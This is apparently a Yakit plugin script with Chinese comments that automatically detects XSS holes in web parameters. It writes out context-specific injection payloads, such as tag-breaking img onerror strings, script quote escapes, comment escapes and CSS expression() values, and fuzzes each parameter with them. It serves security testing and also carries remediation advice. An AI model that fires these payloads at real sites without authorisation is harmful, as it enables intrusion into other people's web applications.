// =============================================================================
// XSS跨站脚本攻击检测脚本 - 全面的XSS漏洞自动化检测工具
// 功能: 检测反射型、存储型、DOM型XSS漏洞，支持多种注入上下文
// 用途: Web安全测试、XSS漏洞扫描、渗透测试、安全审计、漏洞挖掘
//
// 核心技术栈:
// - fuzz.HTTPRequest: HTTP请求模糊测试框架
// - xhtml.Find: HTML节点查找和解析
// - js.ASTWalk: JavaScript语法树分析
// - risk.NewRisk: 安全风险报告生成
// - sync.NewSizedWaitGroup: 并发控制
//
// 检测类型:
// 1. 标签内文本注入 - 构造标签闭合逃逸
// 2. 属性值注入 - 属性闭合和伪协议注入
// 3. 注释内注入 - 注释闭合逃逸
// 4. JavaScript上下文注入 - JS代码注入和DOM型XSS
// 5. 特殊属性注入 - 事件处理器直接注入
//
// 检测流程:
// 1. 参数位置识别 - 确定注入点在HTML中的位置
// 2. 上下文分析 - 分析注入点的HTML/JS上下文
// 3. 载荷构造 - 根据上下文构造对应的XSS载荷
// 4. 危险字符检测 - 检测WAF过滤的字符
// 5. 载荷过滤 - 过滤被WAF阻止的载荷
// 6. 并发测试 - 多线程执行XSS检测
// 7. 结果验证 - 验证XSS载荷是否成功执行
//
// 关键词: XSS检测 跨站脚本 Web安全 漏洞扫描 HTML注入 JavaScript注入 DOM XSS
// 搜索标签: #xss #cross-site-scripting #web-security #html-injection #javascript-injection
// AI搜索词: XSS漏洞检测 跨站脚本攻击 Web安全扫描 HTML注入检测 反射型XSS 存储型XSS DOM型XSS
// =============================================================================

// ===== 调试和输出配置 - 控制日志级别和输出方式 =====
// 关键词: 调试配置, 日志输出, debug模式, yakit输出, 日志级别

// 启用调试模式 - 控制详细日志输出
// 关键词: debug标志, 调试开关, 日志控制, 开发模式
debug = true

// 保存原始输出函数 - 用于调试模式切换
// 关键词: 原始输出, yakit_output, 输出函数备份
origin_yakit_output = yakit_output

// 配置输出方式 - 根据调试模式选择输出方法
// 关键词: 输出配置, 条件输出, 调试输出, 生产输出
yakit_output = 1
if debug {
    // 调试模式 - 详细日志和控制台输出
    // 关键词: 调试日志, log.setLevel, debug级别, 控制台输出
    log.setLevel("debug")
    yakit_output = func(v...) {println(v...)}
} else {
    // 生产模式 - 标准日志级别和yakit输出
    // 关键词: 生产日志, info级别, yakit输出, 标准模式
    log.setLevel("info")
    yakit_output = origin_yakit_output
}


// ===== XSS载荷数据结构 - 定义XSS测试载荷的数据格式 =====
// 关键词: XSS载荷, 数据结构, payload结构, 载荷类型, 危险字符

// XSS载荷构造函数 - 创建标准化的XSS测试载荷
// 关键词: newPayload, 载荷构造, XSS payload, 载荷数据结构
// 参数说明:
// - value: XSS载荷内容，实际的注入代码
// - dangerousChars: 可能被WAF过滤的危险字符集合
// - payloadType: 载荷类型，决定注入上下文和验证方式
//   * "tag": 标签内文本注入，需要构造标签闭合逃逸
//   * "attr": 属性值注入，需要属性闭合或伪协议注入  
//   * "spec-attr": 特殊属性注入，可直接使用JavaScript代码
//   * "comment": 注释内注入，需要注释闭合逃逸
//   * "js": Script标签内注入，JavaScript上下文或DOM型XSS
// 返回值: 包含载荷信息的字典对象
newPayload = func(value, dangerousChars, payloadType) {
    return {"value": value, "dangerousChars": dangerousChars, "payloadType": payloadType }
}

// ===== XSS检测结果数据结构 - 定义漏洞检测结果的数据格式 =====
// 关键词: 检测结果, 漏洞结果, XSS结果, 结果数据结构

// XSS检测结果构造函数 - 创建标准化的漏洞检测结果
// 关键词: newResult, 结果构造, XSS结果, 漏洞报告数据
// 参数说明:
// - maybeVuln: 布尔值，表示漏洞可能存在（可能误报）
// - url: 存在漏洞的URL地址
// - param: 漏洞参数对象，包含参数名和位置信息
// - payload: XSS载荷对象，参考newPayload函数返回值
// - reqRaw: 原始HTTP请求数据，用于漏洞复现
// - respRaw: 原始HTTP响应数据，包含XSS执行证据
// 返回值: 包含完整漏洞信息的结果对象
newResult = func(maybeVuln, url, param, payload, reqRaw, respRaw) {
    return {"maybeVuln": maybeVuln, "url": url, "param": param, "payload": payload, "reqRaw": reqRaw, "respRaw": respRaw }
}

// ===== 参数过滤函数 - 过滤不适合XSS测试的特殊参数 =====
// 关键词: 参数过滤, filterParams, 参数白名单, 参数黑名单, 测试参数筛选

// 参数过滤函数 - 移除不适合进行XSS测试的特殊参数
// 关键词: filterParams, 参数筛选, 特殊参数过滤, submit参数过滤
// 功能: 过滤掉可能影响测试结果或不适合注入的参数
// 过滤规则:
// - POST表单中的submit按钮参数
// - 可扩展添加更多过滤规则
filterParams = func(params) {
    // 创建新的参数数组 - 存储过滤后的参数
    // 关键词: 新参数数组, make函数, 参数容器, 过滤结果
    newParams = make([]var)
    
    // 遍历所有参数进行过滤判断
    // 关键词: 参数遍历, 过滤循环, 参数检查, 条件过滤
    for _, param = range params {
        // 过滤POST表单中的submit参数 - 避免影响表单提交逻辑
        // 关键词: submit参数, POST参数, 正则匹配, 参数位置检查
        // 过滤条件: 参数名为submit且位于POST请求中
        if str.MatchAllOfRegexp(param.Name(), `^(?i)submit$`) && str.HasPrefix(param.PositionVerbose(), "POST") {
            // 跳过submit参数 - 不进行XSS测试
            // 关键词: 参数跳过, continue语句, 过滤跳过
            continue   
        }
        
        // 添加通过过滤的参数到结果数组
        // 关键词: 参数添加, append函数, 过滤通过, 有效参数
        newParams = append(newParams, param)
    }
    
    // 返回过滤后的参数数组
    // 关键词: 过滤结果, 返回参数, 有效参数列表
    return newParams
}

// 特殊标签判断
specialAttr = func(attrName) {
    attrName = str.ToUpper(attrName)
    return attrName == "ONAFTERPRINT" || attrName == "ONBEFOREPRINT" || attrName == "ONBEFOREONLOAD" || attrName == "ONBLUR" || attrName == "ONERROR" || attrName == "ONFOCUS" || attrName == "ONHASCHANGE" || attrName == "ONLOAD" || attrName == "ONMESSAGE" || attrName == "ONOFFLINE" || attrName == "ONONLINE" || attrName == "ONPAGEHIDE" || attrName == "ONPAGESHOW" || attrName == "ONPOPSTATE" || attrName == "ONREDO" || attrName == "ONRESIZE" || attrName == "ONSTORAGE" || attrName == "ONUNDO" || attrName == "ONUNLOAD" || attrName == "ONBLUR" || attrName == "ONCHANGE" || attrName == "ONCONTEXTMENU" || attrName == "ONFOCUS" || attrName == "ONFORMCHANGE" || attrName == "ONFORMINPUT" || attrName == "ONINPUT" || attrName == "ONINVALID" || attrName == "ONRESET" || attrName == "ONSELECT" || attrName == "ONSUBMIT" || attrName == "ONKEYDOWN" || attrName == "ONKEYPRESS" || attrName == "ONKEYUP" || attrName == "ONCLICK" || attrName == "ONDBLCLICK" || attrName == "ONDRAG" || attrName == "ONDRAGEND" || attrName == "ONDRAGENTER" || attrName == "ONDRAGLEAVE" || attrName == "ONDRAGOVER" || attrName == "ONDRAGSTART" || attrName == "ONDROP" || attrName == "ONMOUSEDOWN" || attrName == "ONMOUSEMOVE" || attrName == "ONMOUSEOUT" || attrName == "ONMOUSEOVER" || attrName == "ONMOUSEUP" || attrName == "ONMOUSEWHEEL" || attrName == "ONSCROLL" || attrName == "ONABORT" || attrName == "ONCANPLAY" || attrName == "ONCANPLAYTHROUGH" || attrName == "ONDURATIONCHANGE" || attrName == "ONEMPTIED" || attrName == "ONENDED" || attrName == "ONERROR" || attrName == "ONLOADEDDATA" || attrName == "ONLOADEDMETADATA" || attrName == "ONLOADSTART" || attrName == "ONPAUSE" || attrName == "ONPLAY" || attrName == "ONPLAYING" || attrName == "ONPROGRESS" || attrName == "ONRATECHANGE" || attrName == "ONREADYSTATECHANGE" || attrName == "ONSEEKED" || attrName == "ONSEEKING" || attrName == "ONSTALLED" || attrName == "ONSUSPEND" || attrName == "ONTIMEUPDATE" || attrName == "ONVOLUMECHANGE" || attrName == "ONWAITING" || attrName == "ONTOUCHSTART" || attrName == "ONTOUCHMOVE" || attrName == "ONTOUCHEND" || attrName == "ONTOUCHENTER" || attrName == "ONTOUCHLEAVE" || attrName == "ONTOUCHCANCEL" ||  attrName == "ONGESTURESTART" || attrName == "ONGESTURECHANGE" || attrName == "ONGESTUREEND" || attrName == "ONPOINTERDOWN" || attrName == "ONPOINTERUP" || attrName == "ONPOINTERCANCEL" || attrName == "ONPOINTERMOVE" || attrName == "ONPOINTEROVER" || attrName == "ONPOINTEROUT" || attrName == "ONPOINTERENTER" || attrName == "ONPOINTERLEAVE" || attrName == "ONGOTPOINTERCAPTURE" || attrName == "ONLOSTPOINTERCAPTURE" || attrName == "ONCUT" || attrName == "ONCOPY" || attrName == "ONPASTE" || attrName == "ONBEFORECUT" || attrName == "ONBEFORECOPY" || attrName == "ONBEFOREPASTE" || attrName == "ONAFTERUPDATE" || attrName == "ONBEFOREUPDATE" || attrName == "ONCELLCHANGE" || attrName == "ONDATAAVAILABLE" || attrName == "ONDATASETCHANGED" || attrName == "ONDATASETCOMPLETE" || attrName == "ONERRORUPDATE" || attrName == "ONROWENTER" || attrName == "ONROWEXIT" || attrName == "ONROWSDELETE" || attrName == "ONROWINSERTED" || attrName == "ONCONTEXTMENU" || attrName == "ONDRAG" || attrName == "ONDRAGSTART" || attrName == "ONDRAGENTER" || attrName == "ONDRAGOVER" || attrName == "ONDRAGLEAVE" || attrName == "ONDRAGEND" || attrName == "ONDROP" || attrName == "ONSELECTSTART" || attrName == "ONHELP" || attrName == "ONBEFOREUNLOAD" || attrName == "ONSTOP" || attrName == "ONBEFOREEDITFOCUS" || attrName == "ONSTART" || attrName == "ONFINISH" || attrName == "ONBOUNCE" || attrName == "ONBEFOREPRINT" || attrName == "ONAFTERPRINT" || attrName == "ONPROPERTYCHANGE" || attrName == "ONFILTERCHANGE" || attrName == "ONREADYSTATECHANGE" || attrName == "ONLOSECAPTURE" || attrName == "ONDRAGDROP" || attrName == "ONDRAGENTER" || attrName == "ONDRAGEXIT" || attrName == "ONDRAGGESTURE" || attrName == "ONDRAGOVER" || attrName == "ONCLOSE" || attrName == "ONCOMMAND" || attrName == "ONINPUT" || attrName == "ONCONTEXTMENU" || attrName == "ONOVERFLOW" || attrName == "ONOVERFLOWCHANGED" || attrName == "ONUNDERFLOW" || attrName == "ONPOPUPHIDDEN" || attrName == "ONPOPUPHIDING" || attrName == "ONPOPUPSHOWING" || attrName == "ONPOPUPSHOWN" || attrName == "ONBROADCAST" || attrName == "ONCOMMANDUPDATE" || attrName == "STYLE"
}

// 特殊标签payload
specialAttrPayload = func(attrName, verifyRandStr) {
    payload = ""

    if attrName == "STYLE" {
        payload = sprintf("xss: expression(prompt(`%s`))", verifyRandStr)
    } else {
        payload = sprintf("prompt(`%s`)", verifyRandStr)
    }

    return payload
}

// 检查错误并退出
checkErr = func(err) {
    if err != nil {
        yakit_output(sprintf("XSS-DETECT error: %s", err.Error()))
        os.Exit(1)
    }
}

description  = `XSS 是一种常见的网站安全漏洞，它允许攻击者注入恶意脚本到网页中，然后在其他用户的浏览器上执行。这种攻击发生在用户浏览器端，攻击者可以利用这种漏洞窃取用户信息，如 cookie、session tokens、或其他敏感信息。

XSS 攻击通常可以归类为三种类型：
    1. 存储型 XSS：攻击者提交的恶意脚本被存储在服务器上，当其他用户请求页面时，恶意脚本被发送到用户的浏览器并执行。
    2. 反射型 XSS：恶意脚本不存储在服务器上，而是在 URL 中传输。当用户点击恶意链接或提交一个表单时，恶意脚本被发送到用户的浏览器并执行。
    3. DOM 型 XSS：攻击者利用网页的 DOM 脚本，使得恶意脚本在用户浏览器上执行。`

solution = `输入过滤：所有用户输入都应被视为不可信，需要进行适当的处理。在将用户输入插入到 HTML 页面之前，应该进行 HTML 转义，将特殊字符转换为对应的 HTML 实体。例如，将 < 转换为 <，将 > 转换为 > 等。
输出编码：在将数据输出到 HTML 页面时，应使用安全的编码方式，如使用 HTML 实体编码来处理所有的非信任数据。
使用 HTTP-only Cookies：将敏感的 cookies 标记为 HTTP-only，这样 JavaScript 就无法读取这些 cookies。这可以防止攻击者通过 XSS 攻击窃取用户的 cookies。
内容安全策略 (CSP)：CSP 是一种浏览器安全机制，可以限制网页中脚本的来源和执行方式，从而防止 XSS 攻击。例如，你可以设置 CSP 只允许执行自身站点的脚本，或者禁止执行内联脚本。
更新并维护系统：保持系统、网络和应用程序的安全更新，以防止已知的安全漏洞被利用。

以上就是 XSS 漏洞的基本描述和修复方案，需要注意的是，修复 XSS 漏洞需要全面的安全策略和持续的维护，以上提供的修复方案只是其中的一部分。`
// 最后结果 日志输出
xssLog = func(result) {
    maybeVuln = result.maybeVuln
    url = result.url
    param = result.param 
    payload = result.payload
    reqRaw = result.reqRaw  
    respRaw = result.respRaw
    msg = "Found xss"

    if maybeVuln {
        msg = "Maybe xss"
    }
    payloadString := sprintf("%s=%s", param.Name(), payload.value)

    report = {"message": msg, "payload": payloadString, "payload_type": payload.payloadType, "param_position": param.PositionVerbose()}
    
    yakit_output(report)

    risk.NewRisk(
        url,
        risk.title(sprintf("XSS for: %v", url)),
        risk.titleVerbose(sprintf("检测到xss漏洞: %v", url)),
        risk.details(report),
        risk.description(description),
        risk.solution(solution),
        risk.type("xss"),
        risk.payload(payloadString),
        risk.request(reqRaw), 
        risk.response(respRaw),
        risk.severity("warning"),
    )
    
}

// 将参数在页面中回显的payload 存入数据库中
EchoLog = func(result) {
    url = result.url
    param = result.param 
    payload = result.payload
    reqRaw = result.reqRaw  
    respRaw = result.respRaw
    payloadString := sprintf("%s=%s", param.Name(), payload.value)
    report = {"message": "XSS echo", "payload": payloadString, "payload_type": payload.payloadType, "param_position": param.PositionVerbose()}

    risk.NewRisk(
        url,
        risk.title(sprintf("Echo for: %v %s: %s", url, param.PositionVerbose(), param.Name())),
        risk.details(report),
        risk.type("xss-echo"),
        risk.payload(payloadString),
        risk.request(reqRaw),
        risk.response(respRaw),
        risk.severity("low"),
        risk.description(description),
        risk.solution(solution),
    )
}


// fuzz并返回原始请求与原始响应
Rawfuzz = func(param, fuzzPayload) {
    freq = param.Fuzz(fuzzPayload)
    httpReq, err = freq.GetFirstFuzzHTTPRequest()
    checkErr(err)
    rawReq, err = httpReq.GetOriginHTTPRequest()
    checkErr(err)
    reqBody, err = http.dump(rawReq)
    checkErr(err)
    reqBody = reqBody
    respChannel,err =  freq.Exec()
    checkErr(err)
    rsp = <-respChannel
    respBody, err = str.ExtractBodyFromHTTPResponseRaw(rsp.ResponseRaw)
    checkErr(err)

    return rsp.Response, reqBody, respBody
}


payloadFuzzTask = func(swg, resultCh, url, param, verifyRandStr, payload) {
    swg.Add()

    go func {
        defer swg.Done()

        rsp, reqBody, newBody = Rawfuzz(param, payload.value)

        // 客户端/服务端错误则不验证
        if rsp.StatusCode >= 400 {
            return
        }

        existVuln = false
        maybeVuln = false
        extraMsg = ""
        payloadType = payload.payloadType

        if payloadType == "js" {
        verifyMatchNodes = xhtml.Find(newBody, verifyRandStr) // js类型的payload判断漏洞存在条件为: js中包含"verifyRandStr"这个字符串字面量
            for _, matchNode = range verifyMatchNodes {
                if matchNode.TagName != "script" {
                    continue
                }
                result,err = js.ASTWalk(matchNode.MatchText)
                if err != nil { // 如果ASTWalk报错，则可能存在xss
                    existVuln = true
                    maybeVuln = true
                    break
                }


                for _,s = range result.StringLiteral{
                    if s == verifyRandStr {
                        existVuln = true
                        break
                    }
                }

                if len(result.BadSyntax) > 0 { // 如果js语法出现错误，则可能存在xss
                    existVuln = true
                    maybeVuln = true
                    break
                }
            }
        } else {
            if payloadType == "comment" { // comment类型的payload判断漏洞存在条件: 逃出注释
                verifyMatchNodes = xhtml.Find(newBody, verifyRandStr)
                for _, matchNode = range verifyMatchNodes {
                    if matchNode.IsText() && matchNode.MatchText == verifyRandStr {
                        existVuln = true
                        break
                    }
                }
            } elif str.HasPrefix(payloadType, "spec") { // ! 对spec-attr类型的漏洞不做判断,可能存在误报
                existVuln = true
                maybeVuln = true
            } else { // tag或attr类型的payload判断漏洞存在条件: 存在属性值为verifyRandStr的节点，证明标签逃逸或者属性逃逸
                verifyMatchNodes = xhtml.Find(newBody, verifyRandStr)
                for _, matchNode = range verifyMatchNodes {
                    if matchNode.IsAttr() && matchNode.Key == "id" && matchNode.Val == verifyRandStr {
                        existVuln = true
                        break
                    }
                }
            }
        }

        if existVuln {
            contentType = ""
            try {
                contentType = rsp.Header["Content-Type"][0]
            } catch {
                contentType = ""
            }
            if contentType.Contains("html") { // 响应类型包含html
                result = newResult(maybeVuln, url, param, payload, reqBody, newBody)
                resultCh <- result
            }
        } else {
            // 如果判断不存在漏洞，就将有回显的位置payload写入数据库中，防止误报
            // EchoLog(newResult(false, url, param, payload, reqBody, newBody))
        }
    }
}

paramFuzzTask = func(threads, url, param) {
    // ! 一 判断参数存在的位置
    randStr = str.RandStr(5)
    verifyRandStr =  str.RandStr(8)

    _, reqBody, rawBody = Rawfuzz(param, randStr)

    // ! 二 从节点中找到随机字符串所在位置
    matchNodes = xhtml.Find(rawBody, randStr)

    /*
        ! 三 根据节点位置分出类型
        1.(tag)标签内文本: 构造标签闭合
        2.(attr)属性: 构造标签闭合或伪协议,如果是特殊属性可以直接使用javascript代码
        3.(comment)注释：构造标签闭合
        4.(js)script 标签内：构造标签闭合或dom型
    */
    payloads = []

    for _, matchNode = range matchNodes {

        if matchNode.IsText() {
            /*
            4. script标签内
            例：<script>a = '<参数>';</script>
            */
            if matchNode.TagName == "script" {
                // 引号判断
                matchText = matchNode.MatchText
                randStrIndex = str.Index(matchNode.MatchText, randStr)
                quote = ""
                for {
                    randStrIndex -= 1
                    if randStrIndex < 0{
                        break
                    }
                    chr = matchText[randStrIndex]
                    if chr == '=' {
                        break
                    } elif chr == '"' {
                        quote = `"`
                        break
                    } elif chr == '\'' {
                        quote = `'`
                        break
                    } elif chr == '`' {
                        quote = "`"
                        break
                    }
                }

                payloads = append(payloads, newPayload(sprintf("1%s;prompt('%s');%s", quote, verifyRandStr, quote), ";"+quote, "js"))

                payloads = append(payloads, newPayload(sprintf("1%s;</%s><%s id='%s' src=1 onerror='prompt(1)'><%s>%s", quote, xhtml.RandomUpperAndLower(matchNode.TagName), xhtml.RandomUpperAndLower("img"), verifyRandStr, xhtml.RandomUpperAndLower(matchNode.TagName), quote), "<>"+quote, "tag"))
            } else {
                /*
                1.标签内文本: 构造标签闭合
                例：<div><参数></div>
                */
                payloads = append(payloads, newPayload(sprintf("</%s><%s id='%s' src=1 onerror='prompt(1)'><%s>", xhtml.RandomUpperAndLower(matchNode.TagName), xhtml.RandomUpperAndLower("img"), verifyRandStr, xhtml.RandomUpperAndLower(matchNode.TagName)), "<>", "tag"))
            }
        } elif matchNode.IsAttr() {
            /*
            2.属性: 构造标签闭合或伪协议,如果是特殊属性可以直接使用javascript代码
            例：<div id="<参数>"></div> <img src=1 onerror="<参数>"></div>
            */
            attrName = str.ToUpper(matchNode.Key)

            // 特殊属性处理
            if specialAttr(attrName) {
                payload = specialAttrPayload(attrName, verifyRandStr)
                payloads = append(payloads, newPayload(payload, "", "spec-attr"))
            } else {
                payload = sprintf("\"></%s><%s id='%s' src=1 onerror='prompt(1)'><%s %s=\"", xhtml.RandomUpperAndLower(matchNode.TagName), xhtml.RandomUpperAndLower("img"), verifyRandStr, xhtml.RandomUpperAndLower(matchNode.TagName), matchNode.Key)
                payloads = append(payloads, newPayload(payload, "<>/", "attr"))

                payload = sprintf("'></%s><%s id='%s' src=1 onerror='prompt(1)'><%s %s='", xhtml.RandomUpperAndLower(matchNode.TagName), xhtml.RandomUpperAndLower("img"), verifyRandStr, xhtml.RandomUpperAndLower(matchNode.TagName), matchNode.Key)
                payloads = append(payloads, newPayload(payload, "<>/", "attr"))

                payload = sprintf("></%s><%s id='%s' src=1 onerror='prompt(1)'><%s %s=", xhtml.RandomUpperAndLower(matchNode.TagName), xhtml.RandomUpperAndLower("img"), verifyRandStr, xhtml.RandomUpperAndLower(matchNode.TagName), matchNode.Key)
                payloads = append(payloads, newPayload(payload, "<>/", "attr"))
            }
        } elif matchNode.IsCOMMENT() {
            /*
            3.注释：构造标签闭合
            例：<!-- <参数> -->
            */
            payloads = append(payloads, newPayload(sprintf("-->%s<%s>prompt(1);</%s><!--", verifyRandStr, xhtml.RandomUpperAndLower("script"), xhtml.RandomUpperAndLower("script")), "<>-", "comment"))
        }
    }
    log.debug(sprintf("[%d] payloads: %s", len(payloads), payloads))

    // ! 四 检测危险字符并过滤payload
    filterChars = []
    allDangerousChars = ["<", ">", "'", "\"", "/", "-"]
    i = 0

    detectPayload = randStr + str.Join(allDangerousChars, randStr) + randStr
    resp, err = param.Fuzz(detectPayload).Exec()
    checkErr(err)
    rspo = <-resp
    body, err = str.ExtractBodyFromHTTPResponseRaw(rspo.ResponseRaw)
    checkErr(err)
    randStrFromIndex = body

    for {
        n, btChr = xhtml.MatchBetween(randStrFromIndex, randStr, randStr, 50)
        if n == -1 || i >= len(allDangerousChars){
            break
        }

        if allDangerousChars[i] != btChr {
            pass = false
            filterChars = append(filterChars, string(allDangerousChars[i]))
        }
        randStrFromIndex = randStrFromIndex[n:]
        i += 1
    }
    log.debug(sprintf("[%d]filterChars: %s", len(filterChars), filterChars))

    // ! 五 根据filterChars判断能使用的payload进行Fuzz，找到xss
    swg = sync.NewSizedWaitGroup(threads)
    resultCh = make(chan map[string]var, len(payloads))


    for _, payload = range payloads {
        isFilter = false

        for _, filterChar = range filterChars {
            if str.Contains(payload.dangerousChars, filterChar) {
                isFilter = true
            }
        }
        if isFilter {
            // 如果被过滤了，就将有回显的位置payload写入数据库中，防止误报
            // EchoLog(newResult(false, url, param, payload, reqBody, rawBody))
            continue
        }
        log.debug(sprintf("Available payload: %s payloadType: %s dangerousChars: %s", payload.value, payload.payloadType, payload.dangerousChars))

        payloadFuzzTask(swg, resultCh, url, param, verifyRandStr, payload)
    }

    swg.Wait()
    close(resultCh)

    
    // ! 六 输出结果
    saveDB = true 
    for result = range resultCh {
        if !saveDB {
            continue
        }
        xssLog(result)
        saveDB = false
    }
}



__test__ = func() {
    results, err := yakit.GenerateYakitMITMHooksParams("GET", "http://127.0.0.1:8990/xss/example4.php?name=hacker&v=hacker2")
    if err != nil {
        return
    }
    isHttps, url, reqRaw, rspRaw, body = results
    mirrorFilteredHTTPFlow(results...)
}


mirrorFilteredHTTPFlow = func(ishttps, url, req, rsp, body) {
    threads = 10
    pathDetect = true

    // 构造fuzz请求
    freq, err = fuzz.HTTPRequest(req, fuzz.https(ishttps))
    checkErr(err)

    // 获取参数，包含post json、post form、get参数、cookie参数 路径参数（会自动过滤PHPSESSID、_ga、_gid等参数）
    params = freq.GetCommonParams()    

    if pathDetect {
        pathAppendParams = freq.GetPathAppendParams()
        params = append(params, pathAppendParams...)
        pathBlockParams = freq.GetPathBlockParams()
        params = append(params, pathBlockParams...)
    }
    
    params = filterParams(params)
    

    // 遍历所有param进行fuzz
    for _, param = range params {
        paramFuzzTask(threads, url, param)
    }

}